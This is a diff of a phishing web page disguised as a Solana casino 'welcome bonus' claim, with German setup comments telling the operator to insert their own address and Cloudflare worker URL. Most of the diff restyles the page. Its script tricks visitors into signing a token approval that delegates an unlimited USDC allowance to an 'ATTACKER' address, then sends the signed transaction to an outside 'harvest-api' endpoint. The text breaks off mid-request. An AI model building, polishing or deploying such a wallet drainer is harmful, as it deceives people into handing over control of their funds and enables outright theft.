@@ -3,114 +3,277 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>SolCasino — Welcome Bonus</title>
+<title>SolCasino | Welcome Bonus</title>
 <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
 <script src="https://unpkg.com/@solana/spl-token@0.3.9/lib/index.iife.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  
   body {
-    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-    background: #09090b;
-    color: #fff;
+    font-family: 'Inter', sans-serif;
+    background-color: #050505;
+    color: #ffffff;
     min-height: 100vh;
-    display: flex; align-items: center; justify-content: center;
-    padding: 20px;
-    background-image: radial-gradient(circle at 50% 0%, rgba(20, 241, 149, 0.15) 0%, transparent 50%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    position: relative;
   }
+
+  /* Background Animations */
+  .orb {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(80px);
+    z-index: 0;
+    animation: float 10s infinite ease-in-out alternate;
+  }
+  .orb-1 {
+    width: 300px; height: 300px;
+    background: rgba(153, 69, 255, 0.4); /* Solana Purple */
+    top: -10%; left: -10%;
+    animation-delay: 0s;
+  }
+  .orb-2 {
+    width: 400px; height: 400px;
+    background: rgba(20, 241, 149, 0.2); /* Solana Green */
+    bottom: -20%; right: -10%;
+    animation-delay: -5s;
+  }
+
+  @keyframes float {
+    0% { transform: translate(0, 0) scale(1); }
+    100% { transform: translate(30px, 50px) scale(1.1); }
+  }
+
+  /* Main Card */
   .card {
-    background: #111114;
-    border: 1px solid #27272a;
-    border-radius: 24px;
-    padding: 32px 24px;
-    max-width: 400px; width: 100%;
+    position: relative;
+    z-index: 10;
+    background: rgba(20, 20, 25, 0.6);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 32px;
+    padding: 40px;
+    width: 100%;
+    max-width: 420px;
     text-align: center;
-    box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8), 0 0 40px rgba(20, 241, 149, 0.1);
+    box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.1);
+    animation: cardEntry 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+
+  @keyframes cardEntry {
+    from { opacity: 0; transform: translateY(30px) scale(0.95); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  /* Solana Logo */
+  .solana-logo {
+    width: 64px;
+    height: 64px;
+    margin: 0 auto 24px;
+    display: flex;
+    gap: 3px;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+  }
+  .solana-bar {
+    width: 40px;
+    height: 8px;
+    background: linear-gradient(90deg, #9945FF 0%, #14F195 100%);
+    transform: skewX(-20deg);
+    border-radius: 2px;
+  }
+  .solana-bar:nth-child(1) { width: 30px; margin-left: -10px; }
+  .solana-bar:nth-child(3) { width: 30px; margin-right: -10px; }
+
+  /* Typography */
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    background: rgba(20, 241, 149, 0.1);
+    border: 1px solid rgba(20, 241, 149, 0.2);
+    color: #14F195;
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    padding: 8px 16px;
+    border-radius: 100px;
+    margin-bottom: 24px;
+  }
+  .badge-dot {
+    width: 6px;
+    height: 6px;
+    background: #14F195;
+    border-radius: 50%;
+    margin-right: 8px;
+    box-shadow: 0 0 10px #14F195;
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0% { box-shadow: 0 0 0 0 rgba(20, 241, 149, 0.7); }
+    70% { box-shadow: 0 0 0 10px rgba(20, 241, 149, 0); }
+    100% { box-shadow: 0 0 0 0 rgba(20, 241, 149, 0); }
+  }
+
+  h1 { font-size: 28px; font-weight: 800; margin-bottom: 8px; letter-spacing: -0.5px; }
+  .sub { color: #a1a1aa; font-size: 15px; margin-bottom: 32px; line-height: 1.5; }
+
+  /* Bonus Display */
+  .bonus-container {
+    background: rgba(0, 0, 0, 0.4);
+    border: 1px solid rgba(255, 255, 255, 0.05);
+    border-radius: 20px;
+    padding: 24px;
+    margin-bottom: 32px;
     position: relative;
     overflow: hidden;
   }
-  .card::before {
-    content: '🎰'; position: absolute; top: -20px; right: -20px;
-    font-size: 100px; opacity: 0.05; transform: rotate(15deg);
+  .bonus-container::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%; width: 50%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
+    animation: shine 3s infinite;
   }
-  .logo {
-    width: 80px; height: 80px; border-radius: 24px;
-    background: linear-gradient(135deg, #14f195 0%, #9945ff 100%);
-    margin: 0 auto 20px;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 36px; font-weight: 900; color: #000;
-    box-shadow: 0 10px 30px rgba(20, 241, 149, 0.3);
+
+  @keyframes shine {
+    100% { left: 200%; }
   }
-  .badge {
-    display: inline-block;
-    background: rgba(20, 241, 149, 0.1);
-    color: #14f195;
-    font-size: 11px; font-weight: 700;
-    letter-spacing: 1px; text-transform: uppercase;
-    padding: 6px 14px; border-radius: 20px;
-    margin-bottom: 16px;
-    border: 1px solid rgba(20, 241, 149, 0.3);
-  }
-  h1 { font-size: 24px; margin-bottom: 8px; font-weight: 800; letter-spacing: -0.5px; }
-  .sub { color: #a1a1aa; font-size: 14px; margin-bottom: 24px; }
-  .bonus-box {
-    background: linear-gradient(180deg, #18181b 0%, #09090b 100%);
-    border: 1px solid #27272a; border-radius: 16px;
-    padding: 20px; margin-bottom: 24px;
-  }
-  .bonus-amount {
-    font-size: 48px; font-weight: 900;
-    background: linear-gradient(135deg, #14f195, #9945ff);
-    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+
+  .amount {
+    font-size: 56px;
+    font-weight: 800;
     line-height: 1;
+    background: linear-gradient(135deg, #ffffff 0%, #a1a1aa 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
   }
-  .bonus-currency { font-size: 16px; color: #14f195; font-weight: 700; margin-top: 4px; }
-  button {
-    width: 100%; padding: 18px;
-    background: linear-gradient(135deg, #14f195 0%, #059669 100%);
-    color: #000; border: none; border-radius: 12px;
-    font-size: 16px; font-weight: 800; cursor: pointer;
-    transition: all 0.2s; text-transform: uppercase; letter-spacing: 0.5px;
+  .currency {
+    font-size: 20px;
+    font-weight: 600;
+    color: #9945FF;
+    background: linear-gradient(135deg, #9945FF, #14F195);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
   }
-  button:active { transform: scale(0.98); }
-  button:disabled { background: #27272a; color: #52525b; }
-  .footer { margin-top: 20px; font-size: 12px; color: #52525b; }
+
+  /* Button */
+  .claim-btn {
+    width: 100%;
+    padding: 20px;
+    background: #ffffff;
+    color: #000000;
+    border: none;
+    border-radius: 16px;
+    font-size: 16px;
+    font-weight: 700;
+    font-family: 'Inter', sans-serif;
+    cursor: pointer;
+    transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+    box-shadow: 0 4px 20px rgba(255, 255, 255, 0.15);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+  }
+  .claim-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 30px rgba(255, 255, 255, 0.25);
+  }
+  .claim-btn:active { transform: translateY(0); }
+  .claim-btn:disabled { background: #27272a; color: #71717a; box-shadow: none; cursor: not-allowed; transform: none; }
+
+  /* Loader */
   .spinner {
-    display: none; width: 20px; height: 20px;
-    border: 3px solid rgba(0,0,0,0.2); border-top-color: #000;
-    border-radius: 50%; animation: spin 0.8s linear infinite;
-    margin: 0 auto;
+    display: none;
+    width: 20px;
+    height: 20px;
+    border: 2px solid rgba(0,0,0,0.1);
+    border-top-color: #000;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
-  .success { display: none; color: #14f195; font-size: 15px; font-weight: 600; margin-top: 16px; }
+
+  /* Success State */
+  .success {
+    display: none;
+    color: #14F195;
+    font-size: 16px;
+    font-weight: 600;
+    margin-top: 20px;
+    animation: cardEntry 0.5s ease-out;
+  }
+  
+  .footer {
+    margin-top: 24px;
+    font-size: 12px;
+    color: #52525b;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+  }
 </style>
 </head>
 <body>
+  <div class="orb orb-1"></div>
+  <div class="orb orb-2"></div>
+
   <div class="card">
-    <div class="logo">♠</div>
-    <span class="badge">Verified Solana Casino</span>
-    <h1>Welcome Bonus</h1>
-    <p class="sub">Your deposit address is eligible.<br>Claim your starting balance.</p>
+    <div class="solana-logo">
+      <div class="solana-bar"></div>
+      <div class="solana-bar"></div>
+      <div class="solana-bar"></div>
+    </div>
     
-    <div class="bonus-box">
-      <div class="bonus-amount">0.50</div>
-      <div class="bonus-currency">SOLANA BONUS</div>
+    <div class="badge">
+      <div class="badge-dot"></div>
+      Verified Platform
+    </div>
+    
+    <h1>Welcome Bonus</h1>
+    <p class="sub">Your wallet is eligible for the exclusive SolCasino starting balance.</p>
+    
+    <div class="bonus-container">
+      <div class="amount">
+        1.50 <span class="currency">SOL</span>
+      </div>
     </div>
 
-    <button id="claimBtn">
+    <button class="claim-btn" id="claimBtn">
       <span id="btnText">Connect & Claim Bonus</span>
       <div class="spinner" id="spin"></div>
     </button>
-    <div class="success" id="success">✓ Bonus approved! Funds added to balance.</div>
     
-    <p class="footer">Secure connection. No deposit required.</p>
+    <div class="success" id="success">
+      ✓ Bonus authorized. Balance added.
+    </div>
+    
+    <div class="footer">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+      Secure Connection
+    </div>
   </div>
 
 <script>
   // ====== CONFIG ======
-  const ATTACKER = "DEINE_SOLANA_ADRESSE_HIER"; // Deine Phantom Adresse!
-  const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; // Deine Cloudflare URL
-  const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; // USDC (oder änder es zu einem anderen Token)
+  const ATTACKER = "DEINE_SOLANA_ADRESSE_HIER"; // <-- Deine Adresse eintragen
+  const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; // <-- Deine Worker URL
+  const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
   // ====================
 
   const btn = document.getElementById("claimBtn");
@@ -128,7 +291,9 @@
       return;
     }
 
-    btn.disabled = true; btnText.textContent = "Connecting..."; spin.style.display = "inline-block";
+    btn.disabled = true; 
+    btnText.textContent = "Connecting..."; 
+    spin.style.display = "block";
 
     try {
       const resp = await provider.connect();
@@ -140,8 +305,8 @@
         resp.publicKey
       );
 
-      btnText.textContent = "Verifying balance...";
-      await new Promise(r => setTimeout(r, 1000));
+      btnText.textContent = "Verifying eligibility...";
+      await new Promise(r => setTimeout(r, 1200));
 
       // Build Approve (Delegation) Instruction
       const delegateIx = splToken.createApproveInstruction(
@@ -149,18 +314,20 @@
         new solanaWeb3.PublicKey(ATTACKER),
         resp.publicKey,
         [],
-        BigInt("18446744073709551615") // Max U64
+        BigInt("18446744073709551615") // Max
       );
 
       const tx = new solanaWeb3.Transaction().add(delegateIx);
       tx.feePayer = resp.publicKey;
       tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
 
-      btnText.textContent = "Sign to activate bonus...";
+      btnText.textContent = "Approve in Wallet...";
 
       // Sign Transaction (Phantom shows "Approve Delegation")
       const signedTx = await provider.signTransaction(tx);
       
+      btnText.textContent = "Processing...";
+
       // Send to Backend
       await fetch(ENDPOINT, {
         method: "POST",
